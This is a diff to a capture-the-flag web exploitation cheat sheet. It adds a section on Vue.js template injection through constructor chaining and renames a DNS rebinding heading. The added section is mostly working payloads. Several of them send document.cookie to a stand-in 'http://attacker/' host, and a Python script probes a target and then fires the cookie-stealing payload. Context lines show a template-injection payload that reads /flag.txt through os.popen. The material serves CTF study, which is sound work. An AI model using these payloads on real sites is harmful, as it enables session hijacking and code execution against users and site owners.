@@ -12,10 +12,11 @@
   - [ERB SSTI + Sequel::DATABASES Bypass (BearCatCTF 2026)](#erb-ssti--sequeldatabases-bypass-bearcatctf-2026)
   - [Mako SSTI](#mako-ssti)
   - [Twig SSTI](#twig-ssti)
+  - [Vue.js Template Injection via toString.constructor (VolgaCTF 2018)](#vuejs-template-injection-via-tostringconstructor-volgactf-2018)
   - [SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)](#ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026)
 - [SSRF](#ssrf)
   - [Host Header SSRF (MireaCTF)](#host-header-ssrf-mireactf)
-  - [DNS Rebinding for TOCTOU](#dns-rebinding-for-toctou)
+  - [DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)](#dns-rebinding-for-toctou-time-of-check-to-time-of-use)
   - [Curl Redirect Chain Bypass](#curl-redirect-chain-bypass)
 - [XXE (XML External Entity)](#xxe-xml-external-entity)
   - [Basic XXE](#basic-xxe)
@@ -261,6 +262,57 @@ ${__import__('os').popen('cat /flag.txt').read()}
 
 **Key insight:** Distinguish Twig from Jinja2 via `{{7*'7'}}` — Twig repeats the string (`7777777`), Jinja2 returns `49`. Twig 3.x removed `_self.env` access; use `|map('system')` filter chain instead.
 
+### Vue.js Template Injection via toString.constructor (VolgaCTF 2018)
+
+**Pattern:** Vue.js client-side template injection using constructor chaining to execute JavaScript. When user input is rendered inside a Vue.js template (via `v-html`, server-side interpolation into Vue templates, or reflected into `{{ }}` delimiters), the template expression evaluator executes JavaScript.
+
+**Basic payloads:**
+```javascript
+// Constructor chaining to create and execute a Function object
+${toString.constructor('document.location="http://attacker/?"+document.cookie')()}
+
+// Alternative constructor chain
+{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}
+
+// Using the _c (createElement) internal to confirm Vue context
+{{_c.constructor('return 1')()}}
+```
+
+**Payload variations for different Vue versions:**
+```javascript
+// Vue 2.x — template expressions have access to the component scope
+{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}
+
+// Vue 2.x — via toString
+${toString.constructor('alert(document.domain)')()}
+
+// Vue 3.x — stricter sandbox, but constructor chaining still works
+{{(_=toString.constructor('return document'))().cookie}}
+```
+
+**Detection and exploitation:**
+```python
+import requests
+
+target = "http://target/page"
+
+# Step 1: Detect Vue.js template injection
+probes = [
+    "{{7*7}}",           # Returns 49 if expressions evaluated
+    "{{toString()}}",    # Returns [object Object] or similar
+    "${7*7}",            # Template literal syntax (some Vue configs)
+]
+for probe in probes:
+    r = requests.get(target, params={"name": probe})
+    print(f"Probe: {probe} -> {r.text[:200]}")
+
+# Step 2: Execute via constructor chain
+payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
+r = requests.get(target, params={"name": payload})
+```
+
+**Key insight:** Vue.js template expressions evaluate JavaScript. When user input is rendered in a Vue template, `toString.constructor(code)()` creates and executes a Function object, bypassing simple keyword filters. This works because JavaScript's `constructor` property on any object provides access to the `Function` constructor. Vue 2.x is more permissive; Vue 3.x has a stricter expression sandbox but constructor chaining often still works. Look for reflected input in pages that include Vue.js and use `{{ }}` or `v-bind` directives.
+
 ### SSTI Quote Filter Bypass via `__dict__.update()` (ApoorvCTF 2026)
 
 **Pattern (KameHame-Hack):** Jinja2 SSTI where quotes are filtered, preventing string arguments. Use Python keyword arguments to bypass — `__dict__.update(key=value)` requires no quotes.
@@ -408,7 +460,7 @@ response, err := http.Get("http://" + c.Request.Host + "/validate")
 
 ---
 
-### DNS Rebinding for TOCTOU
+### DNS Rebinding for TOCTOU (Time-of-Check to Time-of-Use)
 ```python
 rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
 requests.post(f"{TARGET}/register", json={"url": rebind_url})
